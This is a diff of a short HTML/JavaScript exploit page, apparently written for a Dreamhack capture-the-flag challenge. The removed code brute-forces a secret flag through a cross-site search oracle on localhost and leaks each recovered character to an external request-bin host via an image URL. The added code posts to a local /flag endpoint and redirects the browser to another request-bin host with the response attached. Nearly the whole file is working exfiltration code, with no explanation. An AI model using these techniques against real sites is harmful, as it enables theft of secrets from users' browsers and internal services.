@@ -1,40 +1,16 @@
-<iframe id="iframe"></iframe>
-<img id="img">
 <script>
-    async function req(url) {
-        return await new Promise((resolve, reject) => {
-            let script = document.createElement('script');
-            script.src = url;
-            script.onload = () => { 
-                return resolve();
-            };
-            script.onerror = () => {
-                return reject();
-            };
-        });
-    }
-    async function search(query) {
-        try {
-            await req(
-              `http://localhost:8000/search?keyword=${query}`
-            );
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
-    async function exploit() {
-        let chars = "0123456789abcdef"
-        let secret = "DH{";
-        while (!secret.includes("}")) {
-            for (let c of chars) {
-                if (await search(secret + c)) {
-                    secret += c;
-                    img.src = `https://fyxkybj.request.dreamhack.games/${secret}`;
-                    break;
-                }
-            }
-        }
-    }
-    exploit();
+const formData = new FormData();
+formData.append('admin', 'zzlol');
+
+const xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://localhost:8000/flag', true);
+
+xhr.onreadystatechange = function () {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    const response = xhr.responseText;
+    location = 'https://vospwlv.request.dreamhack.games/' + response;
+  }
+};
+
+xhr.send(formData);
 </script>
